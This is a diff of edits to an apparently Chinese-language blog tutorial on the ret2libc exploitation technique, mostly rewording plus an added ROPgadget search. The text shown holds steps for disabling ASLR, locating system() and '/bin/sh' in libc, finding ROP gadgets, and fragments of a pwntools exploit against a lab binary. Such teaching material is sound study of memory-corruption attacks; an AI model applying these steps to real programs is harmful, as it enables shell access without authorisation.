@@ -36,9 +36,9 @@ repost:
   url:
 ---
 
-ret2libc 基于 C 库中的 `system` 函数。该函数会执行传递给它的任何内容，使其成为
-最佳攻击目标。libc 中发现的另一个内容是字符串 `/bin/sh` ；如果你将此字符串传递
-给 `system` 函数，它会弹出一个 shell。
+ret2libc 基于 C 标准库中的 `system` 函数。该函数会执行传递给它的任何内容，
+这使其成为最佳攻击目标。libc 中的另一个内容是字符串 `/bin/sh` ；如果你将
+此字符串传递给 `system` 函数，它会弹出一个 shell。
 
 这就是它的全部内容——将 `/bin/sh` 作为参数传递给 `system` 。
 
@@ -48,9 +48,8 @@ ret2libc 基于 C 库中的 `system` 函数。该函数会执行传递给它的�
 
 ## 0x01 禁用 ASLR
 
-首先，我们将禁用 ASLR。ASLR 随机化 libc 在内存中的位置，这意味着我们无法（无需
-其他步骤）计算出 `system` 和 `/bin/sh` 的位置。为了理解一般理论，我们将从禁用它
-开始。
+首先，我们将禁用 ASLR。ASLR 随机化 libc 在内存中的地址，这意味着我们无法计算出
+`system()` 和 `/bin/sh` 的位置。为了便于你理解一般理论，我们将从禁用它开始。
 
 ```bash
 echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
@@ -60,8 +59,8 @@ echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
 
 ### 1x01 获取 libc 地址
 
-幸运的是 Linux 有一个名为 `ldd` 的命令用于动态链接。如果我们在编译的 ELF 文件上
-运行它，它会告诉我们它使用的库及其地址。
+幸运的是 Linux 有一个名为 `ldd` 的命令用于动态链接。如果我们用它来查看编译好的 ELF
+文件，它会告诉我们它使用的库及其地址。
 
 ```bash
 $ ldd vuln-32
@@ -70,18 +69,18 @@ $ ldd vuln-32
 	  /lib/ld-linux.so.2 => /usr/lib/ld-linux.so.2 (0xf7edd000)
 ```
 
-我们需要 `libc.so.6` ，所以 libc 的地址是 `0xf7c00000` 。
+`libc.so.6` 是我们需要的 libc 文件，所以 libc 的地址是 `0xf7c00000` 。
 
 {{<admonition type="info">}}
 
-`libc` 地址以及 `system` 和 `/bin/sh` 的偏移量对你来说可能不同。这不是问题，它只是
+`libc` 地址以及 `system()` 和 `/bin/sh` 的偏移量对你来说可能不同。这不是问题，它只是
 意味着你有不同的版本的 `libc` 。
 
 {{</admonition>}}
 
 ### 1x02 获取 system() 的地址
 
-为了调用 `system` ，我们肯定需要它在内存中的地址。为此，我们可以使用 `readelf` 命令。
+为了调用 `system()` ，我们肯定需要它在内存中的地址。为此，我们可以使用 `readelf` 命令。
 
 ```bash
 $ readelf -s /usr/lib32/libc.so.6 | grep system
@@ -89,13 +88,13 @@ $ readelf -s /usr/lib32/libc.so.6 | grep system
 ```
 
 `-s` 参数告诉 `readelf` 查看当前 ELF 文件的符号表，符号表中的信息只包括 **全局变量
-和函数名**。这里我们可以发现 `system` 距 `libc` 库的偏移量是 `0x4f610` 。
+和函数名**。这里我们可以发现 `system()` 距 `libc` 库的偏移量是 `0x4f610` 。
 
 ### 1x03 获取 /bin/sh 的地址
 
 由于 `/bin/sh` 只是一个字符串，因此我们可以在刚刚通过 `ldd` 找到的动态链接库的基础上使用
 `strings` 指令。注：当将字符串作为参数传递时，你需要传递指向字符串的 **地址**，而不是字符串
-的十六进制表示形式，因为这就是 C 所期望的方式。
+的十六进制表示形式，因为这就是 C 语言所规定的方式。
 
 ```bash
 $ strings -a -t x /usr/lib32/libc.so.6 | grep /bin/sh
@@ -138,6 +137,10 @@ $ ROPgadget --binary vuln-64 | grep rdi
 [...]
 0x00000000004011cb : pop rdi ; ret
 [...]
+$ ROPgadget --binary vuln-64 | grep rsi
+[...]
+0x00000000004011c9 : pop rsi ; pop r15 ; ret
+[...]
 ```
 
 ```python {title="exp.py"}
@@ -165,7 +168,7 @@ p.sendline(payload)
 p.interactive()
 ```
 
-### 1x06 使用 pwntools 实现半自动
+## 0x03 使用 pwntools 实现半自动
 
 pwntools 拥有大量功能，使这一切变得更加简单。
 
